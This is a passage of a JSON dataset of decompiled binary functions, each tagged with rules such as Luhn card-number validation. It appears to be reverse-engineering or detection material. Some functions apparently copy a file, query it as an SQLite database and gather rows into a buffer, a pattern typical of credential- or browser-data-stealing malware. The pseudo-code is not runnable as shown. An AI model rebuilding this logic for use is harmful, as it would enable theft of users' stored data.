fcn.0042a679(stack0xfffffdb4);\n            }\n            var_234h = 7;\n            var_238h = 0;\n            stack0xfffffdb4 = stack0xfffffdb4 & 0xffff0000;\n            if (0xf < var_138h) {\n                fcn.0042a679(var_14ch);\n            }\n            var_138h = 0xf;\n            var_13ch = 0;\n            var_14ch = var_14ch & 0xffffff00;\n            if (0xf < var_11ch) {\n                fcn.0042a679(var_130h);\n            }\n            var_11ch = 0xf;\n            var_120h = 0;\n            var_130h = var_130h & 0xffffff00;\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0xe);\n            if (0xf < var_18ch) {\n                fcn.0042a679(var_1a0h);\n            }\n            if (iVar4 != 0) {\n                *(var_254h_2 + 0x1c) = *(var_254h_2 + 0x1c) + 1;\n                fcn.0040b600(*(var_254h_2 + 0x1c));\n                fcn.0040b8c0();\n            }\n            fcn.0042a6e0(&fcn.00412b20::var_114h, 0, 0x104);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x445308);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x447144);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x447140);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x44713c);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x44713c);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x447138);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x447134);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x447130);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x445308);\n            puVar3 = var_28h;\n            if (var_3ch < 0x10) {\n                puVar3 = &fcn.00412b20::var_28h;\n            }\n            (**0x463038)(&fcn.00412b20::var_114h, puVar3);\n            (**0x463038)(&fcn.00412b20::var_114h, 0x445308);\n            puVar3 = fcn.00423cb0(&fcn.00412b20::var_1a0h, &fcn.00412b20::var_1bch);\n            var_4h_2._0_1_ = 0x13;\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            (**0x463038)(&fcn.00412b20::var_114h, puVar3);\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_18ch) {\n                fcn.0042a679();\n            }\n            noname_4 = &fcn.00412b20::var_1bch;\n            uVar5 = fcn.00423cb0(&fcn.00412b20::var_1a0h, noname_4);\n            var_4h_2._0_1_ = 0x14;\n            uVar2 = fcn.004129d0(&fcn.00412b20::var_14ch, &fcn.00412b20::var_168h_2, &fcn.00412b20::var_ch_2);\n            var_4h_2._0_1_ = 0x15;\n            puVar3 = fcn.004064e0(&fcn.00412b20::var_130h, uVar2, uVar5);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x16);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            fcn.004209e0(puVar3);\n            if (0xf < var_11ch) {\n                fcn.0042a679();\n            }\n            var_11ch = 0xf;\n            var_120h = 0;\n            var_130h = var_130h & 0xffffff00;\n            if (0xf < var_138h) {\n                fcn.0042a679();\n            }\n            var_138h = 0xf;\n            var_13ch = 0;\n            var_14ch = var_14ch & 0xffffff00;\n            var_4h_2._0_1_ = 0xe;\n            if (0xf < var_18ch) {\n                fcn.0042a679();\n            }\n            uVar5 = fcn.00423cb0(&fcn.00412b20::var_1a0h, &fcn.00412b20::var_1bch);\n            var_4h_2._0_1_ = 0x17;\n            uVar2 = fcn.004129d0(&fcn.00412b20::var_14ch, &fcn.00412b20::var_168h_2, &fcn.00412b20::var_ch_2);\n            var_4h_2._0_1_ = 0x18;\n            puVar3 = fcn.004064e0(&fcn.00412b20::var_130h, uVar2, uVar5);\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 0x19);\n            if (0xf < puVar3[5]) {\n                puVar3 = *puVar3;\n            }\n            fcn.004299c0(*(var_254h_2 + 0x20), &fcn.00412b20::var_114h, puVar3);\n            if (0xf < var_11ch) {\n                fcn.0042a679(var_130h);\n            }\n            var_11ch = 0xf;\n            var_120h = 0;\n            var_130h = var_130h & 0xffffff00;\n            if (0xf < var_138h) {\n                fcn.0042a679(var_14ch);\n            }\n            var_138h = 0xf;\n            var_13ch = 0;\n            var_14ch = var_14ch & 0xffffff00;\n            if (0xf < var_18ch) {\n                fcn.0042a679(var_1a0h);\n            }\n            if (0xf < var_170h) {\n                fcn.0042a679(var_184h);\n            }\n            var_4h_2 = CONCAT31(var_4h_2._1_3_, 6);\n            if (7 < var_1a8h) {\n                fcn.0042a679(var_1bch);\n            }\n            var_250h = var_250h + 7;\n        } while (var_250h != var_258h_2);\n    }\n    puVar3 = var_268h;\n    if (var_268h != NULL) {\n        for (; puVar3 != var_264h; puVar3 = puVar3 + 7) {\n            if (7 < puVar3[5]) {\n                fcn.0042a679(*puVar3);\n            }\n            puVar3[5] = 7;\n            puVar3[4] = 0;\n            *puVar3 = 0;\n        }\n        fcn.0042a679(var_268h);\n    }\n    var_268h = NULL;\n    var_264h = NULL;\n    var_260h = 0;\n    if (0xf < var_154h_2) {\n        fcn.0042a679(var_168h_2);\n    }\n    var_154h_2 = 0xf;\n    var_158h_2 = 0;\n    var_168h_2 = var_168h_2 & 0xffffff00;\n    if (0xf < var_20h) {\n        fcn.0042a679(var_ch_2);\n    }\n    var_20h = 0xf;\n    var_1ch = 0;\n    var_ch_2 = var_ch_2 & 0xffffff00;\n    if (0xf < var_3ch) {\n        fcn.0042a679(var_28h);\n    }\n    var_3ch = 0xf;\n    var_38h = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (0xf < var_58h) {\n        fcn.0042a679(var_44h);\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.0042a75a(noname_4);\n    return;\n}\n",
        "token_count": 4325
    },
    "00413330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with lookup table/f2e93a0d9a164553a93d71878df6b782"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __thiscall fcn.00413330(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_530h_8;\n    uint var_52ch_21;\n    uint var_528h_18;\n    uint var_4h_37;\n    uint var_52ch_20;\n    uint var_528h_17;\n    uint var_534h_7;\n    uint var_52ch_19;\n    uint var_528h_16;\n    uint var_4h_36;\n    uint var_530h_7;\n    uint var_52ch_18;\n    uint var_528h_15;\n    uint var_4h_35;\n    uint var_52ch_17;\n    uint var_528h_14;\n    uint var_534h_6;\n    uint var_52ch_16;\n    uint var_4h_34;\n    uint var_530h_6;\n    uint var_52ch_15;\n    uint var_528h_13;\n    uint var_4h_33;\n    uint var_52ch_14;\n    uint var_528h_12;\n    uint var_534h_5;\n    uint var_52ch_13;\n    uint var_528h_11;\n    uint var_4h_32;\n    uint var_530h_5;\n    uint var_52ch_12;\n    uint var_528h_10;\n    uint var_4h_31;\n    uint var_52ch_11;\n    uint var_528h_9;\n    uint var_534h_4;\n    uint var_52ch_10;\n    uint var_528h_8;\n    uint var_4h_30;\n    uint var_530h_4;\n    uint var_52ch_9;\n    uint var_528h_7;\n    uint var_4h_29;\n    uint var_52ch_8;\n    uint var_528h_6;\n    uint var_534h_3;\n    uint var_52ch_7;\n    uint var_4h_28;\n    uint var_530h_3;\n    uint var_52ch_6;\n    uint var_528h_5;\n    uint var_4h_27;\n    uint var_52ch_5;\n    uint var_528h_4;\n    uint var_534h_2;\n    uint var_52ch_4;\n    uint var_4h_26;\n    uint var_530h_2;\n    uint var_52ch_3;\n    uint var_528h_3;\n    uint var_4h_25;\n    uint var_52ch_2;\n    uint var_528h_2;\n    uint var_530h;\n    uint var_52ch;\n    uint var_528h;\n    uint var_4h_24;\n    uint var_4h_23;\n    uint var_4h_22;\n    uint var_4h_21;\n    uint var_4h_20;\n    uint var_4h_19;\n    uint var_4h_18;\n    uint var_4h_17;\n    uint var_4h_16;\n    uint var_4h_15;\n    uint var_4h_14;\n    uint var_4h_13;\n    uint var_4h_12;\n    uint var_4h_11;\n    uint var_4h_10;\n    uint var_4h_9;\n    uint var_4h_8;\n    uint var_4h_7;\n    uint var_4h_6;\n    uint var_4h_5;\n    uint var_4h_4;\n    uint var_4h_3;\n    uint var_4h_2;\n    uint var_4h;\n    uint var_534h;\n    uint var_10h;\n    uint var_ch;\n    uint *arg_8h;\n    uint var_52ch_57;\n    uint var_528h_50;\n    uint var_524h;\n    uint var_52ch_56;\n    uint var_528h_49;\n    uint var_534h_19;\n    uint var_52ch_55;\n    uint var_530h_19;\n    uint var_52ch_54;\n    uint var_528h_48;\n    uint var_52ch_53;\n    uint var_528h_47;\n    uint var_534h_18;\n    uint var_52ch_52;\n    uint var_530h_18;\n    uint var_52ch_51;\n    uint var_528h_46;\n    uint var_52ch_50;\n    uint var_528h_45;\n    uint var_420h;\n    uint var_534h_17;\n    uint var_52ch_49;\n    uint var_528h_44;\n    uint var_530h_17;\n    uint var_52ch_48;\n    uint var_528h_43;\n    uint var_52ch_47;\n    uint var_528h_42;\n    uint var_534h_16;\n    uint var_52ch_46;\n    uint var_528h_41;\n    uint var_530h_16;\n    uint var_52ch_45;\n    uint var_528h_40;\n    uint var_52ch_44;\n    uint var_528h_39;\n    uint var_534h_15;\n    uint var_52ch_43;\n    uint var_528h_38;\n    uint var_31ch;\n    uint var_530h_15;\n    uint var_52ch_42;\n    uint var_528h_37;\n    uint var_52ch_41;\n    uint var_528h_36;\n    uint var_534h_14;\n    uint var_52ch_40;\n    uint var_528h_35;\n    uint var_530h_14;\n    uint var_52ch_39;\n    uint var_528h_34;\n    uint var_52ch_38;\n    uint var_528h_33;\n    uint var_534h_13;\n    uint var_52ch_37;\n    uint var_528h_32;\n    uint var_530h_13;\n    uint var_52ch_36;\n    uint var_528h_31;\n    uint var_52ch_35;\n    uint var_528h_30;\n    uint var_534h_12;\n    uint var_52ch_34;\n    uint var_528h_29;\n    uint var_530h_12;\n    uint var_52ch_33;\n    uint var_528h_28;\n    uint var_52ch_32;\n    uint var_528h_27;\n    uint var_534h_11;\n    uint var_52ch_31;\n    uint var_530h_11;\n    uint var_52ch_30;\n    uint var_528h_26;\n    uint var_52ch_29;\n    uint var_528h_25;\n    uint var_534h_10;\n    uint var_52ch_28;\n    uint var_530h_10;\n    uint var_52ch_27;\n    uint var_528h_24;\n    uint var_52ch_26;\n    uint var_528h_23;\n    uint var_534h_9;\n    uint var_52ch_25;\n    uint var_528h_22;\n    uint var_530h_9;\n    uint var_52ch_24;\n    uint var_528h_21;\n    uint var_52ch_23;\n    uint var_528h_20;\n    uint var_534h_8;\n    uint var_52ch_22;\n    uint32_t var_528h_19;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_38;\n    \n    var_4h_38 = 0xffffffff;\n    uStack12 = 0x43e2d2;\n    var_ch_2 = *in_FS_OFFSET;\n    var_528h_19 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch_2;\n    *(param_1 + 0x20) = param_2;\n    *(param_1 + 0x1c) = 0;\n    uVar2 = *0x451e0c;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451db8;\n    var_4h_38 = 0;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451ff4;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 1);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x4471a8, uVar2);\n    uVar2 = *0x451ef8;\n    var_4h_38 = 2;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451fc0;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 3);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x4471a8, uVar2);\n    uVar2 = *0x451da4;\n    var_4h_38 = 4;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451d8c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 5);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x452274;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451cf4;\n    var_4h_38 = 6;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x452164;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 7);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x451ed0;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451cf4;\n    var_4h_38 = 8;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x452164;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 9);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x4471a8, uVar2);\n    var_4h_38 = 10;\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x447190, uVar2);\n    uVar2 = *0x451d10;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0xb);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x452208;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x452254;\n    var_4h_38 = 0xc;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x4520dc;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0xd);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x4520c4;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x4522f8;\n    var_4h_38 = 0xe;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451e38;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0xf);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x451cbc;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451fac;\n    var_4h_38 = 0x10;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x4521f0;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x11);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x4471a8, uVar2);\n    uVar2 = *0x451be0;\n    var_4h_38 = 0x12;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x4522a8;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x13);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x4471a8, uVar2);\n    uVar2 = *0x451e6c;\n    var_4h_38 = 0x14;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451cb0;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x15);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x45223c;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x452304;\n    var_4h_38 = 0x16;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x4522f4;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x17);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x4520ac;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x452304;\n    var_4h_38 = 0x18;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x4522f4;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x19);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x451d4c;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x452304;\n    var_4h_38 = 0x1a;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x4522f4;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x1b);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x45227c;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451c2c;\n    var_4h_38 = 0x1c;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451d0c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x1d);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x451f68;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451c2c;\n    var_4h_38 = 0x1e;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451d0c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x1f);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = *0x451d50;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x45205c;\n    var_4h_38 = 0x20;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451ffc;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x21);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x4471a8, uVar2);\n    uVar2 = *0x451f44;\n    var_4h_38 = 0x22;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451c4c;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x23);\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20();\n    uVar2 = fcn.0042ad20();\n    fcn.004062a0(0x447188, uVar2);\n    uVar2 = *0x4521a8;\n    var_4h_38 = 0x24;\n    uVar1 = fcn.0042ad20();\n    fcn.004062a0(uVar2, uVar1);\n    uVar2 = *0x451fdc;\n    var_4h_38 = CONCAT31(var_4h_38._1_3_, 0x25);\n    uVar1 = fcn.0042ad20(*0x451fdc);\n    fcn.004062a0(uVar2, uVar1);\n    var_4h_38 = 0xffffffff;\n    fcn.00412b20(0);\n    fcn.004120d0(*0x451d7c, *0x451b40, *0x451c38, *(param_1 + 0x20), 1);\n    fcn.004120d0(*0x452340, *0x451fd0, *0x451b80, *(param_1 + 0x20), 0);\n    fcn.004120d0(*0x451c14, *0x451e48, *0x451b80, *(param_1 + 0x20), 0);\n    fcn.004120d0(*0x4522fc, *0x45220c, *0x451b80, *(param_1 + 0x20), 0);\n    fcn.004123b0(0x447168, 0x447178, 0x4471a8, *(param_1 + 0x20));\n    fcn.0042a6e0(&var_31ch, 0, 0x104);\n    fcn.0042a6e0(&var_524h, 0, 0x104);\n    fcn.0042a6e0(&var_528h_25, 0, 0x104);\n    fcn.0042a6e0(&var_420h, 0, 0x104);\n    fcn.0042a6e0(&var_528h_31, 0, 0x104);\n    (**0x463038)(&var_31ch, 0x445308);\n    (**0x463038)(&var_31ch, *0x451d20);\n    (**0x463038)(&var_31ch, 0x445308);\n    (**0x463038)(&var_528h_25, *0x451d20);\n    (**0x463038)(&var_528h_25, 0x445308);\n    (**0x463038)(&var_528h_25, *0x451e20);\n    (**0x463038)(&var_528h_25, 0x445308);\n    (**0x463038)(&var_528h_25, *0x452104);\n    (**0x463038)(&var_524h, 0x445308);\n    (**0x463038)(&var_524h, &var_528h_25);\n    (**0x463038)(&var_524h, 0x445308);\n    (**0x463038)(&var_528h_31, *0x451d20);\n    (**0x463038)(&var_528h_31, 0x445308);\n    (**0x463038)(&var_528h_31, *0x451ff8);\n    arg_8h = &var_420h;\n    (**0x463038)(arg_8h, 0x445308);\n    (**0x463038)(&var_420h, &var_528h_31);\n    (**0x463038)(&var_420h, 0x445308);\n    fcn.004120d0(&var_31ch, *0x451d20, 0x4471a8, *(param_1 + 0x20), 0);\n    fcn.004120d0(&var_524h, &var_528h_25, 0x4471a8, *(param_1 + 0x20), 0);\n    fcn.004120d0(&var_420h, &var_528h_31, 0x4471a8, *(param_1 + 0x20), 0);\n    *in_FS_OFFSET = var_ch_2;\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 6100
    },
    "00414640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414640(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_44h, 0, 0x40);\n    fcn.0042a6e0(&var_80h, 0, 0x3c);\n    var_7ch = &var_44h;\n    var_80h = 0x3c;\n    var_78h = 0x40;\n    arg_8h_00 = (**0x462f30)(arg_8h, 0x10000000, &var_80h);\n    (**0x462f14)(arg_8h);\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 235
    },
    "004151f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004151f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_1fc0h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1fb0h;\n    uint var_1fach;\n    uint var_1fa8h;\n    uint var_1fa4h;\n    uint uStackY60;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    fcn.0042bc40();\n    fcn.0042a6e0();\n    arg_8h_00 = arg_8h;\n    (**0x462f30)();\n    iVar1 = (**0x462ff8)();\n    if (iVar1 != 0) {\n        iVar1 = (**0x452548)();\n        if (iVar1 != 0) {\n            uStackY60 = 0x415277;\n            iVar1 = (**0x452590)();\n            if (iVar1 == 0) {\n                uStackY60 = 0x4152c4;\n                iVar1 = (**0x452568)();\n                if (iVar1 == 0) {\n                    uStackY60 = 0x4152e5;\n                    fcn.0042a840(&fcn.004151f0::var_1fa4h, 0, 0);\n                    var_1fa4h._0_1_ = 0;\n                    (**0x452570)();\n                    fcn.0042a75a(arg_8h_00);\n                    return;\n                }\n            }\n            (**0x463038)();\n            uStackY60 = 0x41532f;\n            (**0x452570)();\n            fcn.0042a75a(arg_8h);\n            return;\n        }\n        (**0x463038)();\n    }\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 457
    },
    "00415490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00415490(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = arg_8h;\n    var_10h = arg_ch;\n    iVar1 = (**0x462f40)(&var_10h, 0, 0, 0, 0, 0, &var_8h);\n    if (iVar1 != 0) {\n        *arg_14h = var_8h;\n        arg_8h_00 = (**0x462fe0)(0x40, var_8h);\n        *arg_10h = arg_8h_00;\n        if (arg_8h_00 != 0) {\n            fcn.0042a840(arg_8h_00, var_4h, *arg_14h);\n        }\n    }\n    uVar2 = (**0x4630e0)(var_4h);\n    return uVar2 & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 288
    },
    "00415560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415560(uint arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    *arg_ch = 0;\n    *arg_10h = 0;\n    iVar1 = (**0x462f28)(arg_ch, 0x4472d8, 0, 0);\n    if (-1 < iVar1) {\n        iVar1 = (**0x462f00)(*arg_ch, 0x44729c, 0x4472b8, 0x20, 0);\n        if (-1 < iVar1) {\n            iVar1 = (**0x462edc)(*arg_ch, arg_10h, 0, 0, arg_8h, 0x20, 0);\n            if (-1 < iVar1) {\n                return 1;\n            }\n        }\n        fcn.00415510(arg_ch, arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 217
    },
    "004155d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004155d0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    int32_t arg_8h_01;\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint arg_10h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = arg_8h;\n    arg_10h = arg_ch;\n    arg_8h_00 = fcn.0042a769(arg_ch);\n    fcn.0042a840(arg_8h_00, arg_ch_00, arg_10h);\n    var_4h = arg_8h;\n    var_8h = arg_ch;\n    arg_8h_01 = fcn.0042a769(arg_ch);\n    iVar1 = (**0x462f40)(&var_8h, 0, 0, 0, 0, 0, &var_10h);\n    if (iVar1 != 0) {\n        if (var_10h != 0) {\n            fcn.0042a840(arg_8h_01, var_ch, var_10h);\n        }\n        *(var_10h + arg_8h_01) = 0;\n        return arg_8h_01;\n    }\n    return 0;\n}\n",
        "token_count": 315
    },
    "00415650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415650(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint noname_4, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_220h;\n    uint var_21ch;\n    uint var_215h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    fcn.0042a6e0(&var_108h, 0, 0x104);\n    (**0x463038)(&var_108h, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    (**0x463038)(&var_108h, uVar1);\n    uVar1 = 1;\n    (**0x462ee0)(arg_8h, &var_108h);\n    fcn.0042a6e0(&var_20ch, 0, 0x104);\n    (**0x462e8c)(&var_20ch, 0x4472e4, arg_10h, arg_ch);\n    uVar3 = *0x452280;\n    iVar2 = (**0x452598)(&var_108h, &var_21ch);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_21ch, uVar3, 0xffffffff, &var_215h + 1, 0);\n        if (iVar2 == 0) {\n            uVar3 = (**0x463094)(0, 999999);\n            var_210h = (**0x46301c)(uVar3);\n            iVar2 = (**0x452560)(stack0xfffffde8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x452584)(unique0x10000283, 0);\n                (**0x463038)(var_210h, uVar3);\n                (**0x463038)(var_210h, 0x4472e0);\n                uVar3 = (**0x452584)(stack0xfffffde8, 1);\n                (**0x463038)(var_210h, uVar3);\n                (**0x463038)(var_210h, 0x4452fc);\n                iVar2 = (**0x452560)(stack0xfffffde8);\n            }\n            uVar3 = (**0x462f30)(var_210h);\n            fcn.00429a10(arg_1ch, &var_20ch, var_210h, uVar3);\n            fcn.0042a6e0(&var_210h, 0, 4);\n        }\n        (**0x452564)(stack0xfffffde8);\n        (**0x45259c)(var_21ch);\n    }\n    (**0x462f3c)(&var_108h);\n    fcn.0042a75a(uVar1);\n    return;\n}\n",
        "token_count": 706
    },
